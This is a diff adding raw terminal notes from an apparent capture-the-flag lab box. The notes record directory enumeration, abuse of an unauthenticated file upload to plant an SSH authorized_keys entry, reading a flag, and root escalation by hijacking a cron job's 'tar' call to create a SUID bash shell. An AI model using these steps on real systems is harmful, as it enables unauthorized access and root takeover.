@@ -1,0 +1,172 @@
+
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# dirb http://192.168.206.249:33414 /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Sun Oct 12 00:18:27 2025
+URL_BASE: http://192.168.206.249:33414/
+WORDLIST_FILES: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt
+
+-----------------
+
+GENERATED WORDS: 29984                                                         
+
+---- Scanning URL: http://192.168.206.249:33414/ ----
++ http://192.168.206.249:33414/help (CODE:200|SIZE:137)                                                             
++ http://192.168.206.249:33414/info (CODE:200|SIZE:98)     
+
+
+	
+0	"GET /info : General Info"
+1	"GET /help : This listing"
+2	"GET /file-list?dir=/tmp : List of the files"
+3	"POST /file-upload : Upload files"
+
+
+	
+0	"Python File Server REST API v2.5"
+1	"Author: Alfredo Moroder"
+2	"GET /help = List of the commands"
+
+
+http://192.168.206.249:33414/file-list?dir=/home/alfredo/restapi
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# ssh-keygen -f /tmp/id_rsa 
+Generating public/private ed25519 key pair.
+Enter passphrase for "/tmp/id_rsa" (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /tmp/id_rsa
+Your public key has been saved in /tmp/id_rsa.pub
+The key fingerprint is:
+SHA256:OPoEUBRU30YTgV3YEHZtQ+jpfpTpaA4Y2DSUGQb1R0c root@kali
+The key's randomart image is:
++--[ED25519 256]--+
+|   o=ooo=*OO+=E  |
+|   .   ++=o+o.+  |
+|  .     + +..o . |
+|   .   = o .o    |
+|    . + S  .   o |
+|     o . o  . +  |
+|    . . . .. +   |
+|     o     .+ o  |
+|      .    o..   |
++----[SHA256]-----+
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# cp /tmp/id_rsa.pub        
+cp: missing destination file operand after '/tmp/id_rsa.pub'
+Try 'cp --help' for more information.
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# cp /tmp/id_rsa.pub id_rsa.pub
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# cp id_rsa.pub id_rsa.txt
+                                   
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# curl -v -F "file=@/home/kali/id_rsa.txt" -F "filename=/home/alfredo/.ssh/authorized_keys" http://192.168.206.249:33414/file-upload 
+*   Trying 192.168.206.249:33414...
+* Connected to 192.168.206.249 (192.168.206.249) port 33414
+* using HTTP/1.x
+> POST /file-upload HTTP/1.1
+> Host: 192.168.206.249:33414
+> User-Agent: curl/8.15.0
+> Accept: */*
+> Content-Length: 428
+> Content-Type: multipart/form-data; boundary=------------------------pFUyFYq053n5Gd9WHx9HDa
+> 
+* upload completely sent off: 428 bytes
+< HTTP/1.1 201 CREATED
+< Server: Werkzeug/2.2.3 Python/3.9.13
+< Date: Sun, 12 Oct 2025 08:47:56 GMT
+< Content-Type: application/json
+< Content-Length: 41
+< Connection: close
+< 
+{"message":"File successfully uploaded"}
+* shutting down connection #0
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+──(root㉿kali)-[/home/kali]
+└─# ssh -i /tmp/id_rsa -p 25022 alfredo@192.168.206.249
+The authenticity of host '[192.168.206.249]:25022 ([192.168.206.249]:25022)' can't be established.
+ED25519 key fingerprint is SHA256:kflJUZqQzlDWxXgGuod+HGsJPk++nvt5ZyveJgx1jgQ.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[192.168.206.249]:25022' (ED25519) to the list of known hosts.
+Enter passphrase for key '/tmp/id_rsa': 
+Last login: Tue Mar 28 03:21:25 2023
+[alfredo@fedora ~]$ ls -lsa
+total 20
+0 drwx------. 4 alfredo alfredo  127 Mar 28  2023 .
+0 drwxr-xr-x. 3 root    root      21 Mar 28  2023 ..
+4 -rw-------. 1 alfredo alfredo 3944 Mar 28  2023 .bash_history
+4 -rw-r--r--. 1 alfredo alfredo   18 Jan 25  2021 .bash_logout
+4 -rw-r--r--. 1 alfredo alfredo  141 Jan 25  2021 .bash_profile
+4 -rw-r--r--. 1 alfredo alfredo  492 Jan 25  2021 .bashrc
+4 -rwx------. 1 alfredo alfredo   33 Oct 11 23:41 local.txt
+0 drwxr-xr-x. 3 alfredo alfredo   54 Mar 28  2023 restapi
+0 drwx------. 2 alfredo alfredo   61 Oct 12 04:47 .ssh
+[alfredo@fedora ~]$ cat local.txt
+0978049df0a96ad110cb3bd621864794
+[alfredo@fedora ~]$ 
+
+
+[alfredo@fedora ~]$ crontab -l
+no crontab for alfredo
+[alfredo@fedora ~]$ cat /etc/crontab
+SHELL=/bin/bash
+PATH=/sbin:/bin:/usr/sbin:/usr/bin
+MAILTO=root
+
+# For details see man 4 crontabs
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name  command to be executed
+
+*/1 * * * * root /usr/local/bin/backup-flask.sh
+[alfredo@fedora ~]$ 
+
+
+[alfredo@fedora ~]$ cat > /home/alfredo/restapi/tar <<'EOF'
+#!/bin/sh
+cp /bin/bash /tmp/rootsh
+chmod 4755 /tmp/rootsh
+chown root:root /tmp/rootsh
+EOF
+chmod +x /home/alfredo/restapi/tar
+[alfredo@fedora ~]$ cd /tmp/
+[alfredo@fedora tmp]$ ls -lsa
+total 1364
+   0 drwxrwxrwt   9 root root     220 Oct 12 05:08 .
+   0 dr-xr-xr-x. 17 root root     244 Mar 28  2023 ..
+   4 -rw-r--r--   1 root root    1408 Oct 12 05:07 flask.tar.gz
+1360 -rwxr-xr-x   1 root root 1390080 Oct 12 05:08 rootsh
+
+
+
+
+
+
+
+
+
+
